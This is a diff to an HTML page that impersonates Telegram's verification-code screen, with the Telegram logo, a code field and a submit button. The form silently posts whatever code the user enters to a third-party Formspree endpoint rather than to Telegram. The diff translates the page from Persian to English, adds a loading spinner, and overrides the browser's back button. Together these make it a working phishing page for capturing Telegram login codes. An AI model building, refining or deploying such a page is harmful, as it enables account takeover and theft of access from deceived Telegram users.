@@ -2,7 +2,7 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8" />
-  <title>وارد کردن کد تایید تلگرام</title>
+  <title>Enter Telegram Verification Code</title>
   <style>
     body {
       margin: 0;
@@ -21,6 +21,7 @@
       width: 320px;
       box-shadow: 0 0 15px rgba(0,0,0,0.2);
       text-align: center;
+      position: relative;
     }
     .logo {
       margin-bottom: 20px;
@@ -47,9 +48,31 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      position: relative;
+      z-index: 1;
     }
     button:hover {
       background-color: #0075b6;
+    }
+
+    /* استایل لودینگ */
+    .loader {
+      border: 4px solid rgba(0,0,0,0.1);
+      border-left-color: #0088cc;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      animation: spin 1s linear infinite;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      margin: -12px 0 0 -12px;
+      display: none;
+      z-index: 2;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -59,24 +82,34 @@
       <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" />
     </div>
 
-    <h3>کد تایید را وارد کنید</h3>
+    <h3>Enter the verification code</h3>
 
     <form id="codeForm">
-      <input type="text" id="code" name="code" placeholder="کد تایید" required />
-      <button type="submit">ارسال</button>
+      <input type="text" id="code" name="code" placeholder="Verification Code" required />
+      <button type="submit" id="submitBtn">Submit</button>
+      <div class="loader" id="loader"></div>
     </form>
   </div>
 
   <script>
-    document.getElementById('codeForm').addEventListener('submit', function(event) {
+    const form = document.getElementById('codeForm');
+    const loader = document.getElementById('loader');
+    const submitBtn = document.getElementById('submitBtn');
+    const container = document.getElementById('formContainer');
+
+    form.addEventListener('submit', function(event) {
       event.preventDefault();
 
       const code = document.getElementById('code').value.trim();
 
       if (!code) {
-        alert('لطفاً کد تایید را وارد کنید');
+        alert('Please enter the verification code');
         return;
       }
+
+      loader.style.display = 'block';
+      submitBtn.disabled = true;
+      submitBtn.style.cursor = 'not-allowed';
 
       fetch('https://formspree.io/f/xjkokdbr', {
         method: 'POST',
@@ -88,14 +121,30 @@
       })
       .then(response => {
         if (response.ok) {
-          // پیام تشکر رو نمایش بده و فرم رو مخفی کن
-          const container = document.getElementById('formContainer');
-          container.innerHTML = '<h2>Thank you! Your code has been submitted.</h2>';
+          container.innerHTML = '<h2>Thank you! Your message has been confirmed.</h2><p>The result will be emailed to you.</p>';
+
+          // جایگزین صفحه فعلی در history
+          history.replaceState(null, '', window.location.href);
+          // افزودن state جدید به history
+          history.pushState(null, '', window.location.href);
+
+          // کنترل دکمه برگشت مرورگر
+          window.addEventListener('popstate', function(event) {
+            window.location.href = 'index.html'; // صفحه اول
+          });
         } else {
-          alert('مشکلی در ارسال کد پیش آمد، لطفاً دوباره تلاش کنید.');
+          alert('There was a problem sending your code, please try again.');
+          loader.style.display = 'none';
+          submitBtn.disabled = false;
+          submitBtn.style.cursor = 'pointer';
         }
       })
-      .catch(() => alert('مشکلی در ارسال کد پیش آمد، لطفاً دوباره تلاش کنید.'));
+      .catch(() => {
+        alert('There was a problem sending your code, please try again.');
+        loader.style.display = 'none';
+        submitBtn.disabled = false;
+        submitBtn.style.cursor = 'pointer';
+      });
     });
   </script>
 </body>
